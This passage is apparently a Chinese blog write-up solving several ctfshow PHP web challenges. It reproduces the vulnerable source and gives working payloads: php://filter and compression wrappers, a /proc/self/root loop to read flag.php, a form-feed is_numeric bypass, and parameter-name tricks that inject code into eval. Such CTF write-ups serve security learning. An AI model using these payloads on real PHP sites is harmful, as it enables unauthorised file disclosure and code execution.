class="line">&lt;?php</span><br></pre></td></tr></table></figure>
<p>代码审计一下后发现，题目的意思是让我们提交一个file变量，file不能被识别成正常的文件</p>
<ul>
<li>is_file:判断是否为正常文件</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662775103253-44c8bdb0-d1b3-479c-9aad-dd4c0dd04d06.png#averageHue=%23ebeaea&clientId=ubbe52f17-4861-4&from=paste&height=349&id=u5e7cb43c&name=image.png&originHeight=436&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23638&status=done&style=none&taskId=u7cdc6c1a-b31f-4da7-99c2-569b4cd50d5&title=&width=676.8" alt="image.png"><br>要想被识别成不正常的文件，我们只需要用伪协议即可，虽然题目中ban了几种，但是filter没有ban，我们可以用filter: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>其他也还有几种没被ban的伪协议：<br>payload:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php<br>payload:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>payload：file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</p>
<p>F<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662775634286-5def8a14-e7cc-4bc5-9926-59210d4e4492.png#averageHue=%235c5b5b&clientId=u0baac31d-0ff6-4&from=paste&height=333&id=u2ec263cf&name=image.png&originHeight=416&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34631&status=done&style=none&taskId=u2cd95fd1-757f-43af-96cb-15c56f23180&title=&width=819.2" alt="image.png"></p>
<p>payload2：<br>&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F; self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
<p>其中&#x2F;proc&#x2F;self&#x2F;root类似于一个loop？我在虚拟机里测试了一下发现确实是loop<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662780880152-5c9c8bb6-3af7-4655-ac2b-8ac8a31b06e1.png#averageHue=%23242f3f&clientId=u7734eb3e-fce5-4&from=paste&height=186&id=u77b783ac&name=image.png&originHeight=233&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85604&status=done&style=none&taskId=u312d825a-ba7b-4125-b590-74b57c6ecd6&title=&width=516" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662780897522-9376e4a0-ae90-4cdf-9617-6746b7fc3f37.png#averageHue=%23292f35&clientId=u7734eb3e-fce5-4&from=paste&height=196&id=uffbe0573&name=image.png&originHeight=245&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76949&status=done&style=none&taskId=u075c2a50-9db1-4005-9f3d-d52111e8e96&title=&width=498.4" alt="image.png">.<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662780912295-4aaabd6f-1418-4734-aabc-7922720d8ab3.png#averageHue=%23222b35&clientId=u7734eb3e-fce5-4&from=paste&height=133&id=uc0b7fa45&name=image.png&originHeight=166&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41853&status=done&style=none&taskId=u22f7b6de-5c63-48df-8cdb-1d9a55e7cc5&title=&width=532.8" alt="image.png"><br>所以一直loop类似于超过回溯次数，达到绕过的目的</p>
<h2 id="Web113（伪协议）"><a href="#Web113（伪协议）" class="headerlink" title="Web113（伪协议）"></a>Web113（伪协议）</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="attribute">function</span> filter(<span class="variable">$file</span>)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    <span class="attribute">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>代码几乎一样，就是把filter伪协议ban掉了<br>这里用zlib压缩流伪协议：payload：file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<br>非预期：<br>payload：file&#x3D;compress.bzip2:&#x2F;&#x2F;flag.php<br>这样还得不出答案，bzip2和zlib都是一样的用法，不理解<br>参考：</p>
<h2 id="Web114（伪协议）"><a href="#Web114（伪协议）" class="headerlink" title="Web114（伪协议）"></a>Web114（伪协议）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>感觉弱智。。。。<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662793100426-1a1212f1-3cda-4e18-afca-46aab0f8f8ec.png#averageHue=%23e9cf9e&clientId=u414eb210-4da4-4&from=paste&height=196&id=uf9aa34e7&name=image.png&originHeight=245&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26816&status=done&style=none&taskId=u0e6e9d79-7b49-4004-ad41-400fb906cdd&title=&width=764" alt="image.png"><br>直接出来了<br>这里不能用file啊，file和filter的意思不同，不是读取，而是访问</p>
<h2 id="Web115（trim和is-numeric漏洞）"><a href="#Web115（trim和is-numeric漏洞）" class="headerlink" title="Web115（trim和is_numeric漏洞）"></a>Web115（trim和is_numeric漏洞）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在数字前加上空格，也会被is_numeric函数认为是数字：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;\n1&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\t1&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;\f1&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;\r1&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&quot;\v1&quot;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot; 1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$d</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$e</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$f</span>));<span class="comment">//bool(true)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>trim函数会过滤空格以及\n\r\t\v\0，但不会过滤\f</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$n</span>=<span class="string">&quot; \n\r\t\v\0  aaa  \f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$n</span>));<span class="comment">//aaa   \f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662859933542-aaa468fa-9ea4-4b54-8020-4aaca025d782.png#averageHue=%23434d57&clientId=u3f883e13-381b-4&from=paste&id=uc1b7fa31&name=image.png&originHeight=323&originWidth=382&originalType=url&ratio=1&rotation=0&showTitle=false&size=23748&status=done&style=none&taskId=uda789d7b-0c8b-4afd-9de9-27ee73126ce&title=" alt="image.png"><br>所以payload:?num&#x3D;%0c36<br>为啥我就想不到这些东西呢我日了狗了卧槽</p>
<h2 id="Web123（变量命名规则-SERVER-‘argv’-利用）"><a href="#Web123（变量命名规则-SERVER-‘argv’-利用）" class="headerlink" title="Web123（变量命名规则+SERVER[‘argv’]利用）"></a>Web123（变量命名规则+SERVER[‘argv’]利用）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的代码审计一下发现，这一题是要求我们post传入参数<code>CTF_SHOW</code>，<code>CTF_SHOW.COM</code>，不传入参数<code>fl0g</code>，然后还要传入参数<code>fun</code>，经过过滤后执行fun语句<br>这一题有2个思路，一是利用eval去得到答案，二是利用最后一个判断去<code>echo $flag;</code></p>
<ul>
<li><strong>思路一：</strong></li>
</ul>
<p>post传参：CTF_SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;echo $flag</p>
<p>正当我好奇为什么行不通的时候，查阅资料发现：<br>无论是post还是get传参，当变量名出现<code>空格</code>、<code>+</code>、<code>[</code>，<code>.</code>时，都会自动替换成下划线<code>_</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662864473940-5f89beaa-34bf-4096-b806-29ce00a7b6a5.png#averageHue=%23e2d6b4&clientId=uae5cd142-53c5-4&from=paste&height=117&id=uefb1f093&name=image.png&originHeight=146&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9364&status=done&style=none&taskId=uee4cca65-889a-4228-af42-293c4aaa35f&title=&width=599.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662864487630-c53de843-4fc7-4e64-bde6-6ba4046a5a5d.png#averageHue=%23e2d6b5&clientId=uae5cd142-53c5-4&from=paste&height=114&id=u40de7dce&name=image.png&originHeight=143&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8751&status=done&style=none&taskId=ucf9bb8aa-2e61-4269-a9d0-6ebaf0e27b3&title=&width=663.2" alt="image.png"><br>而当前面有<code>[</code>时，后面的<code>.</code>或者是<code>+</code>，<code>空格</code>，都不会被替换<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662864577925-abd6686c-4b1b-4fd5-a633-4c514f63424a.png#averageHue=%23c8bba2&clientId=uae5cd142-53c5-4&from=paste&height=115&id=u8e07dbc9&name=image.png&originHeight=144&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8925&status=done&style=none&taskId=u5b1758d3-0a50-41ec-9109-3376b99dbb9&title=&width=700.8" alt="image.png"><br>利用这一点我们payload改为：CTF[SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;echo $flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662864611913-e2df618e-8ad4-4229-84fa-7b0f4ee2aad4.png#averageHue=%233e3e3e&clientId=uae5cd142-53c5-4&from=paste&height=341&id=uea1e13d0&name=image.png&originHeight=426&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39202&status=done&style=none&taskId=u36c12d37-3582-4159-aa99-9dc3134ed88&title=&width=630.4" alt="image.png"><br>当然也可以把fun改为include $_GET[1]用伪协议去读取，也可以去读GLOBAS</p>
<ul>
<li><strong>思路二</strong></li>
</ul>
<p>思路二就是满足<code>$fl0g===&quot;flag_give_me&quot;</code>去输出flag<br>这时候就需要去利用<code>$a=$_SERVER[&#39;argv&#39;];</code><br>什么是<code>$_SERVER[&#39;argv&#39;]</code>呢？：<br>首先在本地的php.ini中开启一下<code>register_argc_argv</code>，随便传参可以发现：</p>
<p>$_SERVER[‘argv’]是传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。<strong>当通过 GET 方式调用时，该变量包含请求信息。</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865030013-2efd7632-8729-40f4-bb82-ca10df15b142.png#averageHue=%23c6ffc6&clientId=uae5cd142-53c5-4&from=paste&height=170&id=uf8933f70&name=image.png&originHeight=212&originWidth=546&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9534&status=done&style=none&taskId=ua12e1296-29c6-43f7-b252-1d65672e06d&title=&width=436.8" alt="image.png"><br>然后可以用+（在URL中是空格的意思比%20更严谨），去分隔参数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865148187-1f5dc84a-2219-4ddf-b3ba-f4c38af6ed1d.png#averageHue=%23949f91&clientId=uae5cd142-53c5-4&from=paste&height=181&id=u80f40014&name=image.png&originHeight=226&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9982&status=done&style=none&taskId=u7218fa23-5fea-4217-afae-2b11f5fbbed&title=&width=464" alt="image.png"></p>
<p>跟上面说的一样，post提交是无效的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865297280-2d066755-7449-415a-974e-6032eedd4669.png#averageHue=%23909090&clientId=uae5cd142-53c5-4&from=paste&height=638&id=u98143019&name=image.png&originHeight=797&originWidth=982&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33302&status=done&style=none&taskId=ub7154618-42ac-461b-86d1-0ae7dd06f26&title=&width=785.6" alt="image.png"></p>
<p>可以看到变成两个参数了，利用这一特性可以去构造payload：<br>get：?b&#x3D;1+fl0g&#x3D;flag_give_me<br>post：CTF[SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;parse_str($a[1])</p>
<p>parse_str可以注册变量：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865637988-025f1477-ddd1-42a1-a342-896895a54c64.png#averageHue=%23f8f7f5&clientId=uae5cd142-53c5-4&from=paste&height=314&id=uaf6b0786&name=image.png&originHeight=392&originWidth=610&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29521&status=done&style=none&taskId=ub00a1459-9084-4e86-869c-4833ee209fe&title=&width=488" alt="image.png"><br>当我们如上get传参后，$_SERVER[‘argv’]中的数据是这样的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865687010-84b9db13-0feb-4b7b-9d73-c8e0dfa69651.png#averageHue=%23949f91&clientId=uae5cd142-53c5-4&from=paste&height=176&id=uf1b6013d&name=image.png&originHeight=220&originWidth=710&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11096&status=done&style=none&taskId=u6e82bcea-880f-44a5-bbcd-c7650eb01af&title=&width=568" alt="image.png"><br>可以看到分隔开来了，然后我们用parse_str去注册$a[1]，达到效果输出flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662865721835-6d7792da-315f-49dc-8368-d973441e7bcf.png#averageHue=%23474747&clientId=uae5cd142-53c5-4&from=paste&height=371&id=udcdb1c4a&name=image.png&originHeight=464&originWidth=984&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45600&status=done&style=none&taskId=u94e6aee4-4617-4ada-901b-ac88ac31e44&title=&width=787.2" alt="image.png"></p>
<h2 id="Web125（同上）"><a href="#Web125（同上）" class="headerlink" title="Web125（同上）"></a>Web125（同上）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>就多ban了一些东西，flag,var_dump等等，骚方法很多<br>方法一：<br>payload:(post)<code>CTF[SHOW.COM=1&amp;CTF_SHOW=1&amp;fun=var_export(get_defined_vars())</code><br>当然也可以换成<br><code>CTF[SHOW.COM=1&amp;CTF_SHOW=1&amp;fun=highlight_file($_GET[1])</code>，<code>1=flag.php</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662866283674-b051f561-1528-48ca-b140-becc7b211b36.png#averageHue=%233c3b3b&clientId=uae5cd142-53c5-4&from=paste&height=351&id=ue8d21f72&name=image.png&originHeight=439&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65956&status=done&style=none&taskId=u92a58957-8f66-4ab1-87fc-d60aab4be0f&title=&width=1536" alt="image.png"><br>方法二：<br>同web123方法二<br>get：?b&#x3D;1+fl0g&#x3D;flag_give_me<br>post：CTF[SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;parse_str($a[1])</p>
<h2 id="Web126（同上）"><a href="#Web126（同上）" class="headerlink" title="Web126（同上）"></a>Web126（同上）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 